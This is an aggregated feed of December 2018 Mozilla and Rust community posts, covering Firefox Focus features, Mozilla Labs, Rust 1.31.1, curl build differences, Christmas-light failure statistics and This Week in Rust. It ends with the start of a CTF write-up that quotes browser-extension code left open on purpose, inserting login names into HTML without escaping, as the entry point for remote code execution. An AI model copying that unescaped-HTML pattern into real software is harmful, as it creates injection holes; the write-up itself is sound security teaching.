<p style="text-align: center;"><img alt="" class="aligncenter size-medium wp-image-11887" src="screenshot_20181128-173810-300x533.png" width="300" height="533" /><i>The new Firefox Focus allowlist unblocks cookies and trackers for the current page visit.</i></p>
<p><b>An update on GeckoView</b></p>
<p><a href="https://blog.mozilla.org/blog/2018/10/02/new-firefox-focus-comes-with-search-suggestions-revamped-visual-design-and-an-under-the-hood-surprise-for-android-users/" rel="noopener" target="_top">In October we were happy to announce</a> that Firefox Focus was going to be powered by Mozilla‚Äôs own mobile engine GeckoView. It allows us to implement many amazing new features. We are currently working on a good deal of under-the-hood improvements to enhance the performance of GeckoView. Occasionally some minor bugs may still occur and we‚Äôre looking forward to gathering your feedback, learning from your experiences with GeckoView and improving the engine accordingly.</p>
<p>In order to provide our users with another GeckoView sneak peek and something to test, we‚Äôre proud to also provide a new feature today: Thanks to in-browser security warnings, your mobile web browsing will now be a lot less risky. Firefox Focus will check URLs against <a href="https://developers.google.com/safe-browsing/v4/update-api" rel="noopener" target="_top">Google‚Äôs constantly updated lists of unsafe web resources</a>, which includes phishing and other fraudulent sites, and will provide an alert if you reach an unsafe site. You may then either follow to safety, or ignore to continue navigating to the requested site. After all, we value users‚Äô right to choose how to browse, and want to make sure they‚Äôre able to make informed choices.</p>
<p style="text-align: center;"><img alt="" class="aligncenter size-full wp-image-11888" src="unnamed.png" width="288" height="512" /><i>Firefox Focus now warns against phishing and other fraudulent sites.</i></p>
<p><b>Firefox Focus for iOS now supports search suggestions</b></p>
<p>Search suggestions are an important component of searching the web and can make it so much more convenient. That‚Äôs why we‚Äôre making this feature available to iOS users today, after <a href="https://blog.mozilla.org/blog/2018/10/02/new-firefox-focus-comes-with-search-suggestions-revamped-visual-design-and-an-under-the-hood-surprise-for-android-users/" rel="noopener" target="_top">introducing it to Firefox Focus for Android in October</a>. You can easily activate the feature by opening the app settings &gt; click on ‚ÄúSearch‚Äù &gt; and select ‚ÄúGet search suggestions‚Äù.</p>
<p style="text-align: center;"><img alt="" class="aligncenter size-full wp-image-11889" src="unnamed2.png" width="236" height="512" /><i>New for iOS users: get search suggestions and find what you‚Äôre looking for even faster!</i></p>
<p><b>Get Firefox Focus now</b></p>
<p>The latest version of Firefox Focus for Android and iOS is now available for download on<a href="https://app.adjust.com/b8s7qo?campaign=moz_blog&amp;adgroup=blog&amp;creative=focus_android" rel="noopener" target="_top"> Google Play</a> and in the<a href="https://itunes.apple.com/app/id1055677337?mt=8" rel="noopener" target="_top"> App Store</a>.</p>
<p>The post <a href="https://blog.mozilla.org/blog/2018/12/20/latest-firefox-focus-provides-more-user-control/" rel="nofollow">Latest Firefox Focus provides more user control</a> appeared first on <a href="https://blog.mozilla.org/" rel="nofollow">The Mozilla Blog</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/blog/2018/12/20/latest-firefox-focus-provides-more-user-control/">by Barbara Bermes at <time datetime="2018-12-20T14:07:46Z" title="December 20, 2018 02:07 PM GMT">‰∏ãÂçà10:07:46</time></a></div></div><div class="news the-mozilla-blog" xml:lang="en-US"><a id="news-11"></a><h3><a href="https://blog.mozilla.org/" title="The Mozilla Blog">The Mozilla Blog</a> ‚Äî <a href="https://blog.mozilla.org/blog/2018/12/20/create-test-innovate-repeat/">Create, test, innovate, repeat.</a></h3><div class="entry"><div class="content"><p>Let‚Äôs imagine a not-too-distant future:</p>
<p>Imagine you are somewhere that is familiar to you such as your home, or your favorite park.</p>
<p>Imagine that everything around you is connected and it has a link.</p>
<p>Imagine you have the internet in your ears and you can speak directly to it.</p>
<p>Imagine that instead of 2D screens around you, the air is alive with knowledge and wonder.</p>
<p>Imagine that you are playing your favorite game with your friend while they are virtually sitting next to you.</p>
<p>¬†</p>
<p>Now, imagine what that looks like covered in ads. Malware is everywhere, and you have no control over what you see or hear.</p>
<hr />
<p>Technology will continue to shape our lives and our future, but what that future looks like is up to us. We are excited about the internet growing and evolving, but new possibilities bring new challenges. We don‚Äôt need to give up control of our personal lives in exchange for great products that rely on personal data for ads. Here at Mozilla, we are working hard to make sure that new technologies evolve in a way that champion privacy and choice. </p>
<p>We do this by engaging with engineers, teachers, researchers, developers, creators, artists, and thinkers around the globe to ensure that every voice is heard. We are constantly building new prototypes and experimental products for platforms that have the potential to build a different kind of web experience.</p>
<p>Today, Mozilla is launching a new <a href="https://labs.mozilla.org/" rel="noopener" target="_top">Mozilla Labs</a>. This is our online space where anyone can find our latest creations, innovations, and cutting-edge technologies.</p>
<p>What will you find at Mozilla Labs?</p>
<p><a href="https://labs.mozilla.org/projects/webxr-viewer/" rel="noopener" target="_top">Download our WebXR Viewer for iOS, where you can get a sneak peek of experiencing augmented reality inside web browser.</a></p>
<p><a href="https://labs.mozilla.org/projects/spoke/" rel="noopener" target="_top">Create new virtual environments with Spoke, and then experience them with friends using Hubs by Mozilla.</a></p>
<p><a href="https://labs.mozilla.org/projects/common-voice/" rel="noopener" target="_top">Contribute to Common Voice, where we help voice systems understand people from diverse backgrounds and put expensive voice data at the hands of independent creators</a></p>
<p><a href="https://labs.mozilla.org/projects/project-things" rel="noopener" target="_top">Get started with Project Things, where we are building a decentralized ‚ÄòInternet of Things‚Äô that is focused on security, privacy, and interoperability.</a></p>
<p><a href="https://labs.mozilla.org/projects/firefox-reality/" rel="noopener" target="_top">Install Firefox Reality and browse the immersive web completely in virtual reality.</a></p>
<p>Those are just a few of the future technologies we worked on in 2018, and we are just getting started. As we ramp up for 2019, we will continue to innovate across platforms such as Virtual Reality, Augmented Reality, Internet of Things, Speech/Voice, Artificial Intelligence, Open Web Technologies, and so much more.</p>
<p>You can check out our cutting-edge projects on <a href="https://labs.mozilla.org/" rel="noopener" target="_top">Mozilla Labs</a>, or you can roll up your sleeves and contribute to one of our many <a href="https://github.com/mozilla" rel="noopener" target="_top">open source projects</a>. Together we can collectively build the future we want to see.</p>
<p>The post <a href="https://blog.mozilla.org/blog/2018/12/20/create-test-innovate-repeat/" rel="nofollow">Create, test, innovate, repeat.</a> appeared first on <a href="https://blog.mozilla.org/" rel="nofollow">The Mozilla Blog</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/blog/2018/12/20/create-test-innovate-repeat/">by Sean White at <time datetime="2018-12-20T13:35:52Z" title="December 20, 2018 01:35 PM GMT">‰∏ãÂçà9:35:52</time></a></div></div><div class="news the-rust-programming-language-blog" xml:lang="en"><a id="news-12"></a><h3><a href="https://blog.rust-lang.org/" title="Rust Blog">The Rust Programming Language Blog</a> ‚Äî <a href="https://blog.rust-lang.org/2018/12/20/Rust-1.31.1.html">Announcing Rust 1.31.1</a></h3><div class="entry"><div class="content"><p>The Rust team is happy to announce a new version of Rust, 1.31.1. Rust is a
systems programming language focused on safety, speed, and concurrency.</p>
<p>If you have a previous version of Rust installed via rustup, getting Rust
1.31.1 is as easy as:</p>
<pre><code>$ rustup update stable
</code></pre>
<p>If you don't have it already, you can <a href="https://www.rust-lang.org/install.html">get <code>rustup</code></a> from the
appropriate page on our website, and check out the <a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1311-2018-12-20">detailed release notes for
1.31.1</a> on GitHub.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/20/Rust-1.31.1.html#whats-in-1.31.1-stable" id="whats-in-1.31.1-stable"></a>What's in 1.31.1 stable</h3>
<p>This patch release fixes a build failure on <code>powerpc-unknown-netbsd</code> by
way of <a href="https://github.com/rust-lang/rust/pull/56562">an update to the <code>libc</code>
crate</a> used by the compiler.</p>
<p>Additionally, the Rust Language Server was updated to fix two critical bugs.
First, <a href="https://github.com/rust-lang/rls/pull/1170">hovering over the type with documentation above single-line
attributes led to 100% CPU
usage:</a></p>
<pre><code class="language-rust">/// Some documentation
#[derive(Debug)] // Multiple, single-line
#[allow(missing_docs)] // attributes
pub struct MyStruct { /* ... */ }
</code></pre>
<p><a href="https://github.com/rust-lang/rls/pull/1171">Go to definition was fixed for std types</a>:
Before, using the RLS on <code>HashMap</code>, for example, tried to open this file</p>
<pre><code class="language-text">~/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/libstd/collections/hash/map.rs
</code></pre>
<p>and now RLS goes to the correct location (for Rust 1.31, note the extra <code>src</code>):</p>
<pre><code class="language-text">~/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/src/libstd/collections/hash/map.rs
</code></pre></div></div><div class="permalink"><a href="https://blog.rust-lang.org/2018/12/20/Rust-1.31.1.html">by The Rust Release Team at <time datetime="2018-12-20T00:00:00Z" title="December 20, 2018 12:00 AM GMT">‰∏äÂçà8:00:00</time></a></div></div><h2><time datetime="2018-12-19">Wednesday, 19 December 2018</time></h2><div class="news daniel-stenberg" xml:lang="en-US"><a id="news-13"></a><h3><a href="https://daniel.haxx.se/blog" title="daniel.haxx.se">Daniel Stenberg</a> ‚Äî <a href="https://daniel.haxx.se/blog/2018/12/19/why-is-curl-different-everywhere/">Why is curl different everywhere?</a></h3><div class="entry"><div class="content"><p>At a talk I did a while ago, someone from the back of the audience raised this question. I found it to be such a great question that I decided to spend a few minutes and explain how this happens and why.</p>
<p><em>In this blog post I‚Äôll stick to discussing the curl command line tool. ‚Äúcurl‚Äù is often also used as a shortcut for the library but let‚Äôs focus on the tool here.</em></p>
<p>When you use a particular curl version installed in a system near you, chances are that it differs slightly from the curl your neighbor runs or even the one that you use in the machines at work.</p>
<p style="text-align: center;"><strong>Why is this?</strong></p>
<h3>Versions</h3>
<p>We release a new curl version every eight weeks. On average we ship over thirty releases in a five-year period.</p>
<p>A lot of people use curl versions that are a few years old, some even <em>many</em> years old. There are easily more than 30 different curl version in active use at any given moment.</p>
<p>Not every curl release introduce changes and new features, but it is very common and all releases are at least always corrected a lot of bugs from previous versions. New features and fixed bugs make curl different between releases.</p>
<p>Linux/OS distributions tend to also patch their curl versions at times, and then they all of course have different criteria and work flows, so the exact same curl version built and shipped from two different vendors can still differ!</p>
<h3>Platforms</h3>
<p>curl builds on almost every platform you can imagine. When you build curl for your platform, it is designed to use features, native APIs and functions available and they will indeed differ between systems.</p>
<p>curl also relies on a number of different third party libraries. The set of libraries a particular curl build is set to use varies by platform, but even more so due to the decisions of the persons or group that built this particular curl executable. The exact set, and the exact versions of each of those third party libraries, will change curl‚Äôs feature set, from subtle and small changes up to large really noticeable differences.</p>
<h3>TLS libraries</h3>
<p>As a special third party library, I want to especially highlight the importance of the TLS library that curl is built to use. It will change not only what SSL and TLS versions curl supports, but also how to handle CA certificates, it provides crypto support for authentication schemes such as NTLM and more. Not to mention that of course TLS libraries also develop over time so if curl is built to use an older release, it probably has less support for later features and protocol versions.</p>
<h3>Feature shaving</h3>
<p>When building curl, you can switch features on and off to a very large extent, making it possible to quite literally build it in several million different combinations. The organizations, people and companies that build curl to ship with their operating systems or their package distribution systems decide what feature set they want or don‚Äôt want for their users. One builder‚Äôs decision and thought process certainly does not have to match the ones of the others‚Äô. With the same curl version, the same TLS library on the same operating system two curl builds might thus still end up different!</p>


<h3>Build your own!</h3>



<p>If you aren‚Äôt satisfied with the version or feature-set of your own locally installed curl ‚Äì build your own!<br /></p></div></div><div class="permalink"><a href="https://daniel.haxx.se/blog/2018/12/19/why-is-curl-different-everywhere/">by Daniel Stenberg at <time datetime="2018-12-19T14:17:59Z" title="December 19, 2018 02:17 PM GMT">‰∏ãÂçà10:17:59</time></a></div></div><div class="news chris-h-c" xml:lang="en"><a id="news-14"></a><h3><a href="https://chuttenblog.wordpress.com/" title="mozilla ‚Äì chuttenblog">Chris H-C</a> ‚Äî <a href="https://chuttenblog.wordpress.com/2018/12/18/data-science-is-festive-christmas-light-reliability-by-colour/">Data Science is Festive: Christmas Light Reliability by Colour</a></h3><div class="entry"><div class="content"><p>This past weekend was a balmy 5 degrees Celsius which was lucky for me as I had to once again climb onto the roof of my house to deal with my Christmas lights. The middle two strings had failed bulbs somewhere along their length and I had a decent expectation that it was the Blue ones. Again.</p>
<p>Two years ago was our first autumn at our new house. The house needed Christmas lights so we bought four strings of them. Over the course of their December tour they suffered devastating bulb failures rendering alternating strings inoperable. (The bulbs are wired in a single parallel strand making a single bulb failure take down the whole string. However, connectivity is maintained so power flows through the circuit.)</p>
<p><img alt="20181104_111900" class="alignnone size-full wp-image-5811" src="20181104_111900.jpg" /></p>
<p>Last year I tested the four strings and found them all faulty. We bought two replacement strings and I scavenged all the working bulbs from one of the strings to make three working strings out of the old four. All five (four in use, one in reserve) survived the season in working order.</p>
<p><img alt="20181104_111948" class="alignnone size-full wp-image-5812" src="20181104_111948.jpg" /></p>
<p>This year in performing my sanity check before climbing the ladder I had to replace lamps in all three of the original strings to get them back to operating condition. Again.</p>
<p><a href="https://web.mit.edu/tere/www/text/grinch.txt">And then I had an idea. A nerdy idea.</a></p>
<p><a href="https://web.mit.edu/tere/www/text/grinch.txt">I had myself a wonderful nerdy idea!</a></p>
<p><a href="https://web.mit.edu/tere/www/text/grinch.txt">‚ÄúI know just what to do!‚Äù I laughed like an old miser.</a></p>
<p><a href="https://web.mit.edu/tere/www/text/grinch.txt">I‚Äôll gather some data and then visualize‚Äôer</a>!</p>
<p>The strings are penta-colour: Red, Orange, Yellow, Green, and Blue. Each string has about an equal number of each colour of bulb and an extra Red and Yellow replacement bulb. Each bulb is made up of an internal LED lamp and an external plastic globe.</p>
<p>The LED lamps are the things that fail either from corrosion on the contacts or from something internal to the diode.</p>
<p>So I started with 6N+12 lamps and 6N+12 globes in total: N of each colour with an extra 1 Red and 1 Yellow per string. Whenever a lamp died I kept its globe. So the losses over time should manifest themselves as a surplus of globes and a defecit of lamps.</p>
<p>If the losses were equal amongst the colours we‚Äôd see a equal surplus of Green, Orange, and Blue globes and a slightly lower surplus of Red and Yellow globes (because of the extras). This is not what I saw when I lined them all up, though:</p>
<p><img alt="An image of christmas lightbulb globes and LED lamps in a histogram fashion. The blue globes are the most populous followed by yellow, green, then red. Yellow LED lamps are the most populous followed by red and green." class="alignnone size-full wp-image-5813" src="20181104_112408.jpg" /></p>
<p>Instead we find ourselves with no oranges (I fitted all the extra oranges into empty blue spots when consolidating), an equal number of lamps and globes of yellow (yellow being one of the colours adjacent to most broken bulbs and, thus, less likely to be chosen for replacement), a mild surplus of red (one red lamp had evidently failed at one point), a larger surplus of green globes (four failed green lamps isn‚Äôt great but isn‚Äôt bad)‚Ä¶</p>
<p>And 14 excess blue globes.</p>
<p>Now, my sampling frequency isn‚Äôt all that high. And my knowledge of confidence intervals is a little rusty. But that‚Äôs what I think I can safely call a statistical <a href="https://en.wikipedia.org/wiki/Outlier">outlier</a>. I‚Äôm pretty sure we can conclude that, on my original set of strings of Christmas lights, Blue LEDs are more likely to fail than any other colour. But why?</p>
<p>I know from my LED history that high-luminance blue LEDs took the longest to be invented (<a href="https://en.wikipedia.org/wiki/Light-emitting_diode#blue_LED">patents filed in 1993</a> over 30 years after the first red LED). I learned from my friend who works at a display company that blue LEDs are more expensive. If I take those together I can suppose that perhaps the manufacturers of my light strings cheaped out on their lot of blue LEDs one year and stuck me, the consumer, with substandard lamps.</p>
<p>Instead of bringing joy, it brought frustration. But also predictive power because, you know what? On those two broken strings I had to climb up to retrieve this past, unseasonably-warm Saturday two of the four failed bulbs were indeed, as I said at the top, the Blue ones. Again.</p>
<div class="jetpack-video-wrapper"></div>
<p>¬†</p>
<p>:chutten</p></div></div><div class="permalink"><a href="https://chuttenblog.wordpress.com/2018/12/18/data-science-is-festive-christmas-light-reliability-by-colour/">by chuttenc at <time datetime="2018-12-18T19:26:52Z" title="December 18, 2018 07:26 PM GMT">‰∏äÂçà3:26:52</time></a></div></div><h2><time datetime="2018-12-18">Tuesday, 18 December 2018</time></h2><div class="news this-week-in-rust"><a id="news-15"></a><h3><a href="https://this-week-in-rust.org/" title="This Week in Rust">This Week In Rust</a> ‚Äî <a href="https://this-week-in-rust.org/blog/2018/12/18/this-week-in-rust-265/">This Week in Rust 265</a></h3><div class="entry"><div class="content"><p>Hello and welcome to another issue of <em>This Week in Rust</em>!
<a href="http://rust-lang.org/">Rust</a> is a systems language pursuing the trifecta: safety, concurrency, and speed.
This is a weekly summary of its progress and community.
Want something mentioned? Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> or <a href="https://github.com/cmr/this-week-in-rust">send us a pull request</a>.
Want to get involved? <a href="https://github.com/rust-lang/rust/blob/master/CONTRIBUTING.md">We love contributions</a>.</p>
<p><em>This Week in Rust</em> is openly developed <a href="https://github.com/cmr/this-week-in-rust">on GitHub</a>.
If you find any errors in this week's issue, <a href="https://github.com/cmr/this-week-in-rust/pulls">please submit a PR</a>.</p>
<h3>Updates from Rust Community</h3>
<h4>News &amp; Blog Posts</h4>
<ul>
<li><a href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html">Tools in the 2018 edition</a>.</li>
<li><a href="https://www.reddit.com/r/rust/comments/a6j5j1/making_rust_float_parsing_fast_and_correct/">Making Rust float parsing fast and correct</a>.</li>
<li><a href="https://www.gnu.org/software/guix/blog/2018/bootstrapping-rust/">Bootstrapping Rust</a>.</li>
<li><a href="https://rust-lang-nursery.github.io/wg-net/2018/12/13/async-update.html">Async in Rust, circa 2018</a>.</li>
<li><a href="https://ferrous-systems.com/blog/rust-analyzer-2019/">Rust Analyzer in 2018 and 2019</a>.</li>
<li><a href="http://fitzgeraldnick.com/2018/12/14/rust-and-webassembly-in-2019.html">Rust and WebAssembly in 2019</a>.</li>
<li><a href="https://guiand.xyz/blog-posts/unboxed-trait-objects.html">Storing unboxed trait objects in Rust</a>.</li>
<li><a href="https://hashnode.com/post/currying-in-rust-part-2-a-glimpse-of-generics-cjphbgun90025pms241ggh3d9">Currying in Rust ‚Äî Part 2 (A glimpse of generics)</a>.</li>
<li><a href="https://jason-williams.co.uk/building-a-js-interpreter-in-rust-part-1/">Building a JS Interpreter in Rust part 1</a>.</li>
<li><a href="https://www.fastly.com/blog/edge-programming-rust-web-assembly">Edge programming with Rust and WebAssembly</a>.</li>
</ul>
<h5>#Rust2019</h5>
<p>Find all #Rust2019 posts at <a href="https://readrust.net/rust-2019/">Read Rust</a>.</p>
<h3>Crate of the Week</h3>
<p>This week's crate is <a href="https://github.com/media-io/yaserde">yaserde</a>, a specialized XML (de)serialization crate compatible with serde. Thanks to <a href="https://users.rust-lang.org/t/crate-of-the-week/2704/472">Marc Antoine Arnaud</a> for the suggestion!</p>
<p><a href="https://users.rust-lang.org/t/crate-of-the-week/2704">Submit your suggestions and votes for next week</a>!</p>
<h3>Call for Participation</h3>
<p>Always wanted to contribute to open-source projects but didn't know where to start?
Every week we highlight some tasks from the Rust community for you to pick and get started!</p>
<p>Some of these tasks may also have mentors available, visit the task page for more information.</p>
<ul>
<li><a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">A call for Rust 2019 Roadmap blog posts</a>.</li>
<li><a href="https://cfp.rustlatam.org/events/rust-latam">Rust Latam CFP is now open, deadline is December 31st</a>.</li>
<li><a href="https://github.com/xd009642/tarpaulin/issues/152">Tarpaulin: OSX support tracking issue</a>. Tarpaulin is a code coverage tool for Rust projects.</li>
<li><a href="https://imag-pim.org/blog/2018/12/04/call-for-participation-2/">The imag project calls for contributors (2)</a>.</li>
</ul>
<p>If you are a Rust project owner and are looking for contributors, please submit tasks <a href="https://users.rust-lang.org/t/twir-call-for-participation/4821">here</a>.</p>
<h3>Updates from Rust Core</h3>
<p>247 pull requests were <a href="https://github.com/search?q=is%3Apr+org%3Arust-lang+is%3Amerged+merged%3A2018-12-10..2018-12-17">merged in the last week</a></p>
<ul>
<li><a href="https://github.com/rust-lang/rust/pull/56749">x86: add the <code>adx</code> target feature to whitelist</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56642">bump minimum required LLVM version to 6.0</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56609">unconditionally emit the target-cpu LLVM attribute</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56755">account for <code>impl Trait</code> when suggesting lifetime</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56850">fixed issue with using <code>Self</code> ctor in typedefs</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56439">clearer error message for dead assign</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56491">emit error with span for empty asserts</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56641">fix span for invalid number of parameters in trait method</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56572">contexually dependent error message for E0424 when value is assigned to "self"</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56540">don't depend on <code>Allocation</code> sizes for pattern length</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56461">some cleanups around <code>AllocId</code> management</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56810">improve MIR match generation for ranges</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56789">rustc: add an unstable <code>simd_select_bitmask</code> intrinsic</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56751">allow ptr::hash to accept fat pointers</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56744">specialize: remove Boxes used by Children::insert</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56742">infer: remove Box from a returned Iterator</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56737"><code>TokenStream</code> improvements</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56369">remove <code>tokenstream::Delimited</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56090">overhaul <code>FileSearch</code> and <code>SearchPaths</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56039"><code>SortedMap</code> upgrades</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56706">make <code>const unsafe fn</code> bodies <code>unsafe</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56702">self-profiler: add column for percent of total time</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56677"><code>#[must_use]</code> on traits in stdlib</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56648">fix <code>BTreeMap</code> UB</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56825">std: activate compiler_builtins <code>mem</code> feature for no_std targets</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56490">add <code>checked_add</code> method to <code>Instant</code> time type</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56161"><code>VecDeque</code>: fix for stacked borrows</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56092">std: depend directly on crates.io crates</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56243">libtest: use deterministic HashMap, avoid spawning thread if there is no concurrency</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56005">greatly improve rustdoc rendering speed issues</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56637">rustdoc: fix local reexports of proc macros</a></li>
</ul>
<h4>Approved RFCs</h4>
<p>Changes to Rust follow the Rust <a href="https://github.com/rust-lang/rfcs#rust-rfcs">RFC (request for comments)
process</a>. These
are the RFCs that were approved for implementation this week:</p>
<p><em>No RFCs were approved this week.</em></p>
<h4>Final Comment Period</h4>
<p>Every week <a href="https://www.rust-lang.org/team.html">the team</a> announces the
'final comment period' for RFCs and key PRs which are reaching a
decision. Express your opinions now.</p>
<h5><a href="https://github.com/rust-lang/rfcs/labels/final-comment-period">RFCs</a></h5>
<p><em>No RFCs are currently in final comment period.</em></p>
<h5><a href="https://github.com/rust-lang/rust/labels/final-comment-period">Tracking Issues &amp; PRs</a></h5>
<ul>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/pull/56550">Short-circuit Rc/Arc equality checking on equal pointers where T: Eq</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/55607">Tracking issue for unsafe operations in const fn</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/54881">Tracking issue for RFC 2539, "#[cfg_attr] expanding to multiple attributes"</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/33158"><code>#[repr(packed(N))]</code> (tracking issue for RFC 1399)</a>.</li>
</ul>
<h4>New RFCs</h4>
<ul>
<li><a href="https://github.com/rust-lang/rfcs/pull/2615">Add file-open-with RFC</a>.</li>
<li><a href="https://github.com/rust-lang/rfcs/pull/2614">eCrate name transfer</a>.</li>
</ul>
<h3>Upcoming Events</h3>
<h5>Online</h5>
<ul>
<li><a href="https://t.me/joinchat/EkKINhHCgZ9llzvPidOssA">Jan  2. Rust Events Team Meeting on Telegram</a>.</li>
</ul>
<h5>Europe</h5>
<ul>
<li><a href="https://www.meetup.com/Cambridge-Rust-Meetup/events/pzwshpyxqbbc/">Dec 20. Cambridge, GB - The Last Cambridge Rust</a>?</li>
<li><a href="https://www.meetup.com/Mozilla-Torino/events/sbtclqyxqbkc/">Dec 20. Turin, IT - Gruppo di studio Rust</a>.</li>
<li><a href="https://www.meetup.com/spbrust/events/gzjnmqyxqbfc">Dec 23. St. Petersburg, RU - St. Petersburg Rust Meetup</a>.</li>
<li><a href="https://rust-brno.github.io/">Jan 10. Brno, CZ, Rust meetup at Masaryk University</a></li>
</ul>
<h5>North America</h5>
<ul>
<li><a href="https://www.meetup.com/Chicago-Rust-Meetup/events/256778181">Dec 20. Chicago, US - Rust for the Holidays</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbfc/">Dec 23. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/Dallas-Rust/events/zfgwzmyxqbhc/">Dec 25. Dallas, US - Dallas Rust - Last Tuesday</a>.</li>
<li><a href="https://www.meetup.com/Ann-Arbor-Rust-Meetup/events/cgsskqyxqbjc/">Dec 26. Ann Arbor, US - Ann Arbor Rust Meetup</a>.</li>
<li><a href="https://www.meetup.com/Vancouver-Rust/events/rzszlqyxqbjc/">Dec 26. Vancouver, CA - Vancouver Rust meetup</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbnc/">Dec 30. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/indyrs/events/246726699/">Jan  2. Indianapolis, US - Indy.rs</a>.</li>
<li><a href="https://www.meetup.com/Rust-ATL/events/cbcmbqyzcbdb/">Jan  2. Atlanta, US - Rust Atlanta Meetup</a>.</li>
</ul>
<p>If you are running a Rust event please add it to the <a href="https://www.google.com/calendar/embed?src=apd9vmbc22egenmtu5l6c5jbfc%40group.calendar.google.com">calendar</a> to get
it mentioned here. Please remember to add a link to the event too.
Email the <a href="mailto:community-team@rust-lang.org">Rust Community Team</a> for access.</p>
<h3>Rust Jobs</h3>
<ul>
<li><a href="https://www.mersive.com/company/join-mersive-team/?gh_jid=4136286002">Sr. Software Engineer - Rust at Mersive, Denver, US</a></li>
<li><a href="https://paritytech.io/jobs/">Rust Developer at Parity, Berlin, DE</a>.</li>
</ul>
<p><em>Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> to get your job offers listed here!</em></p>
<h3>Quote of the Week</h3>
<blockquote>
<p><code>impl Drop for Mic {}</code></p>
</blockquote>
<p>‚Äì Nick Fitzgerald <a href="http://fitzgeraldnick.com/2018/12/13/rust-raps.html">rapping about Rust</a></p>
<p>Thanks to <a href="https://users.rust-lang.org/t/twir-quote-of-the-week/328/588">mark-i-m</a> for the suggestion!</p>
<p><a href="http://users.rust-lang.org/t/twir-quote-of-the-week/328">Please submit your quotes for next week</a>!</p>
<p><em>This Week in Rust is edited by: <a href="https://github.com/nasa42">nasa42</a>, <a href="https://github.com/llogiq">llogiq</a>, and <a href="https://github.com/Flavsditz">Flavsditz</a>.</em></p>
<p><small><a href="https://www.reddit.com/r/rust/comments/a7k9m4/this_week_in_rust_265/">Discuss on r/rust</a>.</small></p></div></div><div class="permalink"><a href="https://this-week-in-rust.org/blog/2018/12/18/this-week-in-rust-265/">by TWiR Contributors at <time datetime="2018-12-18T05:00:00Z" title="December 18, 2018 05:00 AM GMT">‰∏ãÂçà1:00:00</time></a></div></div><h2><time datetime="2018-12-17">Monday, 17 December 2018</time></h2><div class="news wladimir-palant" xml:lang="en-us"><a id="news-16"></a><h3><a href="https://palant.de/" title="Wladimir Palant's notes - mozilla - gecko - security">Wladimir Palant</a> ‚Äî <a href="https://palant.de/2018/12/17/bbn-challenge-resolution-getting-the-flag-from-a-browser-extension">BBN challenge resolution: Getting the flag from a browser extension</a></h3><div class="entry"><div class="content"><p>My so far last BugBountyNotes challenge is called <a href="https://www.bugbountynotes.com/challenge?id=23">Can you get the flag from this browser extension?</a>. Unlike the <a href="https://palant.de/2018/12/10/bbn-challenge-resolution-exploiting-the-screenshotterpro-browser-extension">previous one</a>, this isn‚Äôt about exploiting logical errors but the more straightforward Remote Code Execution. The goal is running your code in the context of the extension‚Äôs background page in order to extract the flag variable stored there.</p>

<p>If you haven‚Äôt looked at this challenge yet, feel free to stop reading at this point and go try it out. Mind you, this one is hard and only two people managed to solve it so far. Note also that I won‚Äôt look at any answers submitted at this point any more. Of course, you can also participate in any of the <a href="https://www.bugbountynotes.com/training">ongoing challenges</a> as well.</p>

<p>Still here? Ok, I‚Äôm going to explain this challenge then.</p>

<h4>The obvious vulnerability</h4>

<p>This browser extension is a minimalist password manager: it doesn‚Äôt bother storing passwords, only login names. And the vulnerability is of a very common type: when generating <span class="caps">HTML</span> code, this extension forgets to escape <span class="caps">HTML</span> entities in the logins:</p>

<pre><code>      for (let login of logins)
        html += `&lt;li&gt;&lt;a href="#" data-value="${login}"&gt;${login}&lt;/a&gt;&lt;/li&gt;`;</code></pre>

